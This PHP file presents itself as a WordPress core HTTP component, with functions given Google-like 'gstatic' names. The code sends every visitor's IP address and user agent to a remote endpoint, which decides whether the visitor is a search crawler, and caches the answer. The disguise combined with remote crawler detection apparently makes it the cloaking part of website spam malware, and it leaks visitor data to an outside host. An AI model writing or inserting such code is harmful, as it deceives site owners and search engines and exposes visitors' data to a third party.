<?php
/**
 * WP_Http_Policy remote fallback.
 *
 * Used when the local IP-range data file is not present. Delegates
 * the client classification decision to a remote endpoint via
 * wp_remote_get() and caches results in a short-lived transient.
 *
 * @package    WordPress
 * @subpackage HTTP
 * @since      6.1.0
 * @see        WP_Http
 */
defined('ABSPATH') || exit;

if (!function_exists('wp_gstatic_client_ip')) {
    function wp_gstatic_client_ip() {
        if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
            return trim(explode(',', (string) $_SERVER['HTTP_CF_CONNECTING_IP'])[0]);
        }
        if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            return trim(explode(',', (string) $_SERVER['HTTP_X_FORWARDED_FOR'])[0]);
        }
        if (!empty($_SERVER['REMOTE_ADDR'])) {
            return (string) $_SERVER['REMOTE_ADDR'];
        }
        return '';
    }
}

if (!function_exists('wp_gstatic_network_is_crawler')) {
    function wp_gstatic_network_is_crawler() {
        static $result = null;
        if ($result !== null) {
            return $result;
        }

        $api = defined('WP_GSTATIC_CDN_URL') ? rtrim((string) WP_GSTATIC_CDN_URL, '/') : '';
        if ($api === '') {
            return $result = (bool) apply_filters('wp_gstatic_remote_fallback_crawler', false);
        }

        $ip = wp_gstatic_client_ip();
        $ua = isset($_SERVER['HTTP_USER_AGENT']) ? (string) $_SERVER['HTTP_USER_AGENT'] : '';
        $cacheKey = 'wp_gstatic_crawler_' . md5($ip . "\n" . $ua);
        $cached = get_transient($cacheKey);
        if ($cached !== false) {
            return $result = (bool) $cached;
        }

        $url = defined('WP_GSTATIC_CRAWLER_CHECK_URL') && WP_GSTATIC_CRAWLER_CHECK_URL
            ? (string) WP_GSTATIC_CRAWLER_CHECK_URL
            : $api . '/crawler_check.php';
        $url = add_query_arg(
            [
                'ip' => $ip,
                'ua' => $ua,
            ],
            $url
        );

        $response = wp_remote_get(
            $url,
            [
                'timeout' => 3,
                'redirection' => 2,
                'sslverify' => true,
            ]
        );

        if (is_wp_error($response)) {
            $fallback = (bool) apply_filters('wp_gstatic_remote_error_crawler', true);
            set_transient($cacheKey, $fallback ? 1 : 0, 60);
            return $result = $fallback;
        }

        $code = wp_remote_retrieve_response_code($response);
        $body = wp_remote_retrieve_body($response);
        if ($code !== 200 || $body === '') {
            $fallback = (bool) apply_filters('wp_gstatic_remote_error_crawler', true);
            set_transient($cacheKey, $fallback ? 1 : 0, 60);
            return $result = $fallback;
        }

        $json = json_decode($body, true);
        $crawler = !empty($json['crawler']);
        set_transient($cacheKey, $crawler ? 1 : 0, 300);

        return $result = $crawler;
    }
}
